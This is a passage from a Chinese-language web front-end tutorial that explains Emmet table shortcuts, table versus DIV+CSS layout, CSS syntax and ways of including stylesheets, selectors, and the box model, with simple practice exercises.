   <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>快速创建表格框架<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">比如：</span><br><span class="line">1. 输入table后按Tab键，就会出来一个<span class="tag">&lt;<span class="name">table</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">2. 输入table&gt;tr后按Tab键,就会出来一个</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">3. 输入table&gt;tr&gt;td后按Tab键,就会出来一个</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">4. 输入table&gt;tr&gt;td*2后按Tab键,就会出来一个</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">5. 输入table&gt;(tr&gt;td*2)*2后按Tab键,就会出来一个</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p></p><h2 id="2-10-页面布局概述"><a href="#2-10-页面布局概述" class="headerlink" title="2.10 页面布局概述"></a>2.10 页面布局概述</h2><p>布局也可以叫做排版，它指的是把文字和图片等元素按照我们的意愿有机地排列在页面上，布局的方式分为两种：</p><p>1、table布局：通过table元素将页面空间划分成若干个单元格，将文字或图片等元素放入单元格中，隐藏表格的边框，从而实现布局。这种布局方式也叫传统布局，目前主要使用在EDM(广告邮件中的页面)中，主流的布局方式不用这种。</p><p>2、HTML+CSS布局(DIV+CSS)：主要通过CSS样式设置来布局文字或图片等元素，需要用到CSS盒子模型、盒子类型、CSS浮动、CSS定位、CSS背景图定位等知识来布局，它比传统布局要复杂，目前是主流的布局方式。</p><h2 id="2-11-table布局及实例"><a href="#2-11-table布局及实例" class="headerlink" title="2.11 table布局及实例"></a>2.11 table布局及实例</h2><p>table来做整体页面的布局，布局的技巧归纳为如下几点：</p><p>1、按照设计图的尺寸设置表格的宽高以及单元格的宽高。</p><p>2、将表格border、cellpadding、cellspacing全部设置为0，表格的边框和间距就不占有页面空间，它只起到划分空间的作用。</p><p>3、针对局部复杂的布局，可以在单元格里面再嵌套表格，嵌套表格划分局部的空间。</p><p>4、单元格中的元素或者嵌套的表格用align和valign设置对齐方式</p><p>5、通过属性或者css样式设置单元格中元素的样式</p><h1 id="3-CSS"><a href="#3-CSS" class="headerlink" title="3. CSS"></a>3. CSS</h1><p>CSS是 Cascading Style Sheets 的首字母缩写，意思是层叠样式表。有了CSS，html中大部分表现样式的标签就废弃不用了，html只负责文档的结构和内容，表现形式完全交给CSS，html文档变得更加简洁。</p><h2 id="3-1-css基本语法及页面引用"><a href="#3-1-css基本语法及页面引用" class="headerlink" title="3.1 css基本语法及页面引用"></a>3.1 css基本语法及页面引用</h2><h3 id="3-1-1-css基本语法"><a href="#3-1-1-css基本语法" class="headerlink" title="3.1.1 css基本语法"></a>3.1.1 css基本语法</h3><p>css的定义方法是：</p><p>选择器 { 属性:值; 属性:值; 属性:值;}</p><p>选择器是将样式和页面元素关联起来的名称，属性是希望设置的样式属性每个属性有一个或多个值。代码示例：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    css注释 ctrl+shift+"/"</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">div</span>&#123; </span><br><span class="line">    <span class="attribute">width</span>:<span class="number">100px</span>; </span><br><span class="line">    <span class="attribute">height</span>:<span class="number">100px</span>; </span><br><span class="line">    <span class="attribute">color</span>:red </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-2-css页面引入方法："><a href="#3-1-2-css页面引入方法：" class="headerlink" title="3.1.2 css页面引入方法："></a>3.1.2 css页面引入方法：</h3><p>1、外联式：通过link标签，链接到外部样式表到页面中。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"css/main.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、嵌入式：通过style标签，在网页上创建嵌入的样式表。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type="text/css"&gt;</span><br><span class="line">    <span class="selector-tag">div</span>&#123; <span class="attribute">width</span>:<span class="number">100px</span>; <span class="attribute">height</span>:<span class="number">100px</span>; <span class="attribute">color</span>:red &#125;</span><br><span class="line">    ......</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>3、内联式：通过标签的style属性，在标签上直接写样式。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"width:100px; height:100px; color:red "</span>&gt;</span>......<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="3-2-css文本设置"><a href="#3-2-css文本设置" class="headerlink" title="3.2 css文本设置"></a>3.2 css文本设置</h2><p>常用的应用文本的css样式：</p><ul><li>color 设置文字的颜色，如： color:red;</li><li>font-size 设置文字的大小，如：font-size:12px;</li><li>font-family 设置文字的字体，如：font-family:’微软雅黑’;</li><li>font-style 设置字体是否倾斜，如：font-style:’normal’; 设置不倾斜，font-style:’italic’;设置文字倾斜</li><li>font-weight 设置文字是否加粗，如：font-weight:bold; 设置加粗 font-weight:normal 设置不加粗</li><li>line-height 设置文字的行高，设置行高相当于在每行文字的上下同时加间距， 如：line-height:24px;</li><li>font 同时设置文字的几个属性，写的顺序有兼容问题，建议按照如下顺序写： font：是否加粗 字号/行高 字体；如： font:normal 12px/36px ‘微软雅黑’;</li><li>text-decoration 设置文字的下划线，如：text-decoration:none; 将文字下划线去掉</li><li>text-indent 设置文字首行缩进，如：text-indent:24px; 设置文字首行缩进24px</li><li>text-align 设置文字水平对齐方式，如text-align:center 设置文字水平居中</li></ul><h2 id="3-3-css颜色表示法"><a href="#3-3-css颜色表示法" class="headerlink" title="3.3 css颜色表示法"></a>3.3 css颜色表示法</h2><p>css颜色值主要有三种表示方法：</p><p>1、颜色名表示，比如：red 红色，gold 金色</p><p>2、rgb表示，比如：rgb(255,0,0)表示红色</p><p>3、16进制数值表示，比如：#ff0000 表示红色，这种可以简写成 #f00</p><h2 id="3-4-css选择器"><a href="#3-4-css选择器" class="headerlink" title="3.4 css选择器"></a>3.4 css选择器</h2><p>常用的选择器有如下几种：</p><h3 id="3-4-1-标签选择器"><a href="#3-4-1-标签选择器" class="headerlink" title="3.4.1 标签选择器"></a>3.4.1 标签选择器</h3><p>标签选择器，此种选择器影响范围大，建议尽量应用在层级选择器中。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&#123;<span class="attribute">margin</span>:<span class="number">0</span>;<span class="attribute">padding</span>:<span class="number">0</span>&#125;</span><br><span class="line"><span class="selector-tag">div</span>&#123;<span class="attribute">color</span>:red&#125;   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div&gt;....&lt;/div&gt;   &lt;!-- 对应以上两条样式 --&gt;</span><br><span class="line">&lt;div class="box"&gt;....&lt;/div&gt;   &lt;!-- 对应以上两条样式 --&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-2-id选择器"><a href="#3-4-2-id选择器" class="headerlink" title="3.4.2 id选择器"></a>3.4.2 id选择器</h3><p>通过id名来选择元素，元素的id名称不能重复，所以一个样式设置项只能对应于页面上一个元素，不能复用，id名一般给程序使用，所以不推荐使用id作为选择器。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#box</span>&#123;<span class="attribute">color</span>:red&#125; </span><br><span class="line"></span><br><span class="line">&lt;div id="box"&gt;....&lt;/div&gt;   &lt;!-- 对应以上一条样式，其它元素不允许应用此样式 --&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-3-类选择器"><a href="#3-4-3-类选择器" class="headerlink" title="3.4.3 类选择器"></a>3.4.3 类选择器</h3><p>通过类名来选择元素，一个类可应用于多个元素，一个元素上也可以使用多个类，应用灵活，可复用，是css中应用最多的一种选择器。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.red</span>&#123;<span class="attribute">color</span>:red&#125;</span><br><span class="line"><span class="selector-class">.big</span>&#123;<span class="attribute">font-size</span>:<span class="number">20px</span>&#125;</span><br><span class="line"><span class="selector-class">.mt10</span>&#123;<span class="attribute">margin-top</span>:<span class="number">10px</span>&#125; </span><br><span class="line"></span><br><span class="line">&lt;div class="red"&gt;....&lt;/div&gt;</span><br><span class="line">&lt;h1 class="red big mt10"&gt;....&lt;/h1&gt;</span><br><span class="line">&lt;p class="red mt10"&gt;....&lt;/p&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-4-层级选择器"><a href="#3-4-4-层级选择器" class="headerlink" title="3.4.4 层级选择器"></a>3.4.4 层级选择器</h3><p>主要应用在选择父元素下的子元素，或者子元素下面的子元素，可与标签元素结合使用，减少命名，同时也可以通过层级，防止命名冲突。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> <span class="selector-tag">span</span>&#123;<span class="attribute">color</span>:red&#125;</span><br><span class="line"><span class="selector-class">.box</span> <span class="selector-class">.red</span>&#123;<span class="attribute">color</span>:pink&#125;</span><br><span class="line"><span class="selector-class">.red</span>&#123;<span class="attribute">color</span>:red&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;</span><br><span class="line">    &lt;span&gt;....&lt;/span&gt;</span><br><span class="line">    &lt;a href="#" class="red"&gt;....&lt;/a&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;h3 class="red"&gt;....&lt;/h3&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-5-组选择器"><a href="#3-4-5-组选择器" class="headerlink" title="3.4.5 组选择器"></a>3.4.5 组选择器</h3><p>多个选择器，如果有同样的样式设置，可以使用组选择器。<br>举例：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span>,<span class="selector-class">.box2</span>,<span class="selector-class">.box3</span>&#123;<span class="attribute">width</span>:<span class="number">100px</span>;<span class="attribute">height</span>:<span class="number">100px</span>&#125;</span><br><span class="line"><span class="selector-class">.box1</span>&#123;<span class="attribute">background</span>:red&#125;</span><br><span class="line"><span class="selector-class">.box2</span>&#123;<span class="attribute">background</span>:pink&#125;</span><br><span class="line"><span class="selector-class">.box3</span>&#123;<span class="attribute">background</span>:gold&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box1"&gt;....&lt;/div&gt;</span><br><span class="line">&lt;div class="box2"&gt;....&lt;/div&gt;</span><br><span class="line">&lt;div class="box3"&gt;....&lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-6-伪类及伪元素选择器"><a href="#3-4-6-伪类及伪元素选择器" class="headerlink" title="3.4.6 伪类及伪元素选择器"></a>3.4.6 伪类及伪元素选择器</h3><p>常用的伪类选择器有hover，表示鼠标悬浮在元素上时的状态，伪元素选择器有before和after,它们可以通过样式在元素中插入内容。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box1</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">color</span>:red&#125;</span><br><span class="line"><span class="selector-class">.box2</span><span class="selector-pseudo">:before</span>&#123;<span class="attribute">content</span>:<span class="string">'行首文字'</span>;&#125;</span><br><span class="line"><span class="selector-class">.box3</span><span class="selector-pseudo">:after</span>&#123;<span class="attribute">content</span>:<span class="string">'行尾文字'</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;div class="box1"&gt;....&lt;/div&gt;</span><br><span class="line">&lt;div class="box2"&gt;....&lt;/div&gt;</span><br><span class="line">&lt;div class="box3"&gt;....&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="3-5-CSS盒子模型"><a href="#3-5-CSS盒子模型" class="headerlink" title="3.5 CSS盒子模型"></a>3.5 CSS盒子模型</h2><h3 id="3-5-1-盒子模型解释"><a href="#3-5-1-盒子模型解释" class="headerlink" title="3.5.1 盒子模型解释"></a>3.5.1 <strong>盒子模型解释</strong></h3><p>元素(标签)在页面中显示成一个方块，类似一个盒子，CSS盒子模型就是使用现实中盒子来做比喻，帮助我们设置元素对应的样式。盒子模型示意图如下：</p><p><img src="/qianduan_images/002.jpg" alt="盒子模型示例图片"></p><p>把元素叫做盒子，设置对应的样式分别为：盒子的宽度(width)、盒子的高度(height)、盒子的边框(border)、盒子内的内容和边框之间的间距(padding)、盒子与盒子之间的间距(margin)。</p><h3 id="3-5-2-设置宽高"><a href="#3-5-2-设置宽高" class="headerlink" title="3.5.2 设置宽高"></a>3.5.2 <strong>设置宽高</strong></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">width</span><span class="selector-pseudo">:200px</span>;  <span class="comment">/* 设置盒子的宽度，此宽度是指盒子内容的宽度，不是盒子整体宽度(难点) */</span> </span><br><span class="line"><span class="selector-tag">height</span><span class="selector-pseudo">:200px</span>; <span class="comment">/* 设置盒子的高度，此高度是指盒子内容的高度，不是盒子整体高度(难点) */</span></span><br></pre></td></tr></table></figure><h3 id="3-5-3-设置边框"><a href="#3-5-3-设置边框" class="headerlink" title="3.5.3 设置边框"></a>3.5.3 <strong>设置边框</strong></h3><p>设置一边的边框，比如顶部边框，可以按如下设置：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">border-top-color</span><span class="selector-pseudo">:red</span>;    <span class="comment">/* 设置顶部边框颜色为红色 */</span>  </span><br><span class="line"><span class="selector-tag">border-top-width</span><span class="selector-pseudo">:10px</span>;   <span class="comment">/* 设置顶部边框粗细为10px */</span>   </span><br><span class="line"><span class="selector-tag">border-top-style</span><span class="selector-pseudo">:solid</span>;  <span class="comment">/* 设置顶部边框的线性为实线，常用的有：solid(实线)  </span></span><br><span class="line"><span class="comment">  dashed(虚线)  dotted(点线); */</span></span><br></pre></td></tr></table></figure><p>上面三句可以简写成一句：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">border-top</span><span class="selector-pseudo">:10px</span> <span class="selector-tag">solid</span> <span class="selector-tag">red</span>;  <span class="comment">/* 顺序无所谓，怎么写都可以 */</span></span><br></pre></td></tr></table></figure><p>设置其它三个边的方法和上面一样，把上面的’top’换成’left’就是设置左边，换成’right’就是设置右边，换成’bottom’就是设置底边。</p><p>四个边如果设置一样，可以将四个边的设置合并成一句：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">border</span><span class="selector-pseudo">:10px</span> <span class="selector-tag">solid</span> <span class="selector-tag">red</span>;</span><br></pre></td></tr></table></figure><h3 id="3-5-4-设置内间距padding"><a href="#3-5-4-设置内间距padding" class="headerlink" title="3.5.4 设置内间距padding"></a>3.5.4 <strong>设置内间距padding</strong></h3><p>设置盒子四边的内间距，可设置如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">padding-top</span>：20<span class="selector-tag">px</span>;     <span class="comment">/* 设置顶部内间距20px */</span> </span><br><span class="line"><span class="selector-tag">padding-left</span><span class="selector-pseudo">:30px</span>;     <span class="comment">/* 设置左边内间距30px */</span> </span><br><span class="line"><span class="selector-tag">padding-right</span><span class="selector-pseudo">:40px</span>;    <span class="comment">/* 设置右边内间距40px */</span> </span><br><span class="line"><span class="selector-tag">padding-bottom</span><span class="selector-pseudo">:50px</span>;   <span class="comment">/* 设置底部内间距50px */</span></span><br></pre></td></tr></table></figure><p>上面的设置可以简写如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">padding</span>：20<span class="selector-tag">px</span> 40<span class="selector-tag">px</span> 50<span class="selector-tag">px</span> 30<span class="selector-tag">px</span>; <span class="comment">/* 四个值按照顺时针方向，分别设置的是 上 右 下 左  </span></span><br><span class="line"><span class="comment">四个方向的内边距值。 */</span></span><br></pre></td></tr></table></figure><p>padding后面还可以跟3个值，2个值和1个值，它们分别设置的项目如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">padding</span>：20<span class="selector-tag">px</span> 40<span class="selector-tag">px</span> 50<span class="selector-tag">px</span>; <span class="comment">/* 设置顶部内边距为20px，左右内边距为40px，底部内边距为50px */</span> </span><br><span class="line"><span class="selector-tag">padding</span>：20<span class="selector-tag">px</span> 40<span class="selector-tag">px</span>; <span class="comment">/* 设置上下内边距为20px，左右内边距为40px*/</span> </span><br><span class="line"><span class="selector-tag">padding</span>：20<span class="selector-tag">px</span>; <span class="comment">/* 设置四边内边距为20px */</span></span><br></pre></td></tr></table></figure><h3 id="3-5-5-设置外间距margin"><a href="#3-5-5-设置外间距margin" class="headerlink" title="3.5.5 设置外间距margin"></a>3.5.5 <strong>设置外间距margin</strong></h3><p>外边距的设置方法和padding的设置方法相同，将上面设置项中的’padding’换成’margin’就是外边距设置方法。</p><h3 id="3-5-6-理解练习"><a href="#3-5-6-理解练习" class="headerlink" title="3.5.6 理解练习"></a>3.5.6 <strong>理解练习</strong></h3><p>通过盒子模型的原理，制作下面的盒子：</p><p><img src="/qianduan_images/003.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">140px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: gold;</span><br><span class="line">    <span class="attribute">border</span>: black <span class="number">10px</span> solid;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;盒子里面的文字内容，距离边框有一定距离。&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="3-6-盒模型的实际尺寸"><a href="#3-6-盒模型的实际尺寸" class="headerlink" title="3.6 盒模型的实际尺寸"></a>3.6 盒模型的实际尺寸</h2><p>按照下面代码制作页面：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;!<span class="selector-tag">DOCTYPE</span> <span class="selector-tag">html</span>&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">&lt;<span class="selector-tag">head</span>&gt;</span><br><span class="line">    &lt;meta charset="UTF-8"&gt;</span><br><span class="line">    &lt;title&gt;盒子的真实尺寸&lt;/title&gt;</span><br><span class="line">    &lt;style type="text/css"&gt;</span><br><span class="line">        <span class="selector-class">.box01</span>&#123;<span class="attribute">width</span>:<span class="number">50px</span>;<span class="attribute">height</span>:<span class="number">50px</span>;<span class="attribute">background-color</span>:gold;&#125;</span><br><span class="line">        <span class="selector-class">.box02</span>&#123;<span class="attribute">width</span>:<span class="number">50px</span>;<span class="attribute">height</span>:<span class="number">50px</span>;<span class="attribute">background-color</span>:gold;<span class="attribute">border</span>:<span class="number">50px</span></span><br><span class="line">         solid <span class="number">#000</span>&#125;</span><br><span class="line">        <span class="selector-class">.box03</span>&#123;<span class="attribute">width</span>:<span class="number">50px</span>;<span class="attribute">height</span>:<span class="number">50px</span>;<span class="attribute">background-color</span>:gold;<span class="attribute">border</span>:<span class="number">50px</span></span><br><span class="line">         solid <span class="number">#000</span>;<span class="attribute">padding</span>: <span class="number">50px</span>;&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">    &lt;div class="box01"&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;div class="box02"&gt;2&lt;/div&gt;</span><br><span class="line">    &lt;br /&gt;</span><br><span class="line">    &lt;div class="box03"&gt;3&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>页面显示效果如下：<br><img src="/qianduan_images/004.jpg" alt="盒子尺寸示例图片"></p><p>通过上面的页面得出结论：盒子的width和height设置的是盒子内容的宽和高，不是盒子本身的宽和高，盒子的真实尺寸计算公式如下：</p><ul><li>盒子宽度 = width + padding左右 + border左右</li><li>盒子高度 = height + padding上下 + border上下</li></ul><p><strong>理解练习</strong><br>通过盒子模型的原理，制作下面的盒子：</p><p><img src="/qianduan_images/005.jpg" alt="课堂练习示例图片"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">380px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">font-family</span>: <span class="string">"Microsoft YaHei"</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#333</span>;</span><br><span class="line">    <span class="attribute">border-top</span>: <span class="number">1px</span> solid <span class="number">#ff0000</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">3px</span> solid <span class="number">#666666</span>;</span><br><span class="line">    <span class="attribute">padding-top</span>: <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">padding-left</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">20px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;div class="box"&gt;新闻列表&lt;/div&gt;</span><br></pre></td></tr></table></figure><h2 id="3-7-盒模型使用技巧及相关问题"><a href="#3-7-盒模型使用技巧及相关问题" class="headerlink" title="3.7 盒模型使用技巧及相关问题"></a>3.7 盒模型使用技巧及相关问题</h2><h3 id="3-7-1-margin相关技巧"><a href="#3-7-1-margin相关技巧" class="headerlink" title="3.7.1 margin相关技巧"></a>3.7.1 <strong>margin相关技巧</strong></h3><p>1、设置元素水平居中： margin:x auto;<br>2、margin负值让元素位移及边框合并</p><p><strong>理解练习</strong><br>1、制作一个600*100的盒子，边框1像素黑色，距离浏览器顶部100px，水平居中。<br></p><figure class="highlight"><table><tr><td 